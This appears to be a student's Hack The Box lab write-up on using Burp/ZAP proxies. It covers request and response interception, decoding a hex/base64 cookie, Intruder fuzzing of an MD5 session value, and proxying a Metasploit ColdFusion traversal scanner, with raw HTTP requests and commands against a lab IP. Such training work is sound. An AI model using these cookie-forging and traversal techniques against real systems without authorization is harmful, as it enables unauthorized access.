
# Brief

We are performing internal penetration testing for a local company. As you come across their internal web applications, you are presented with different situations where Burp/ZAP may be helpful. 

Read each of the scenarios in the questions below, and determine the features that would be the most useful for each case. Then, use it to help you in reaching the specified goal.


# Questions

1. The `/lucky.php` page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.

```sh
# Launch burp and start the browser to access the app
http://94.237.59.174:43851/lucky.php

# Intercept the response to the request, remove the disabled CSS property in the form tag so that it looks like this
    <form name='getflag' class='form' method='post' id='form1'>
        <button class='btn block-cube block-cube-hover' id='submit' type='submit' formmethod='post' name='getflag' value='true'>
    </form>
        

# You will then get a request similar to this one.

POST /lucky.php HTTP/1.1
Host: 94.237.59.174:43851
Content-Length: 12
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://94.237.59.174:43851
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.59.174:43851/lucky.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

getflag=true


# Intercept the respinse to that request too to see the flag at the bottom
<p style="text-align:center">HTB{FLAG}</p>


# Basically, intercept requests and responses to requests until you either see the flag in the response or in the UI.
```
<br>
<br>

2. The `/admin.php` page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.



```sh
# Intercept the response to the request or look into the network tab to get the cookie

HTTP/1.1 200 OK
Date: Sun, 22 Jun 2025 23:44:51 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=rurbkmnsfsruo2ojgc9vntnnmj; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d

# Use either decoder or cyberchef to decode. I used cyberchef and it decoded in seconds with the auto decoder. Recipe is 
From Hex. Delimiter: None
From Base64: Standard, Remove non-alphabet chars

# In burp, decode the cookie from ASCII Hex, Then from Base64
```

<br>
<br>

3. Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the `alphanum-case.txt` wordlist from Seclist for the payload)

```sh
# Wordlist
https://git.selfmade.ninja/shamanm725/SecLists/-/blob/master/Fuzzing/alphanum-case.txt

# Can also load the 3 separate lists if you have Burp Pro. Looks like before I can use the thing, there's an intermediary step. Generate all the possible md5 with the alphanum-case

base="3dac93b8cd250aa8c1a36fffc79a17a"; for i in {A..Z} {a..z} {0..9}; do echo "${base}${i}"; done

# Use the result as a simple list for payload configuration. Also paste the MD5 cookie as version instead of the original. In Payload processing
Base64-encode
Encode as ASCII hex
deselect Payload encoding

# Nope. Cookie tooo long. Other option.
Add 1 as as the placeholder to intruder parameter.

# In the payload processing rules, follow this order
Add "3dac93b8cd250aa8c1a36fffc79aXXX" as prefix
Add base64-encode
Add Encode as ASCII hex


# No redirection. Response code nor length didn't even stand out. They all give you the flag once you have the correct order in Intruder processing.
```

<br>
<br>

4. You are using the `auxiliary/scanner/http/coldfusion_locale_traversal` tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the `XXXXX` directory being called in `/XXXXX/administrator/..`?

```sh
# Turn Intercept on then, open terminal for the msf portion
msfconsole -q
use auxiliary/scanner/http/coldfusion_locale_traversal 

options

set Proxies HTTP:127.0.0.1:8080
Proxies => HTTP:127.0.0.1:8080

set rhosts  Your_Target_IP
rhosts => 94.237.59.174

[msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> set rport Your_Target_Port
rport => 43851

[msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> run

# If everything was set up properly, see the captured request and get the folder
GET /XXXXX/administrator/index.cfm HTTP/1.1
Host: 94.237.59.174
```
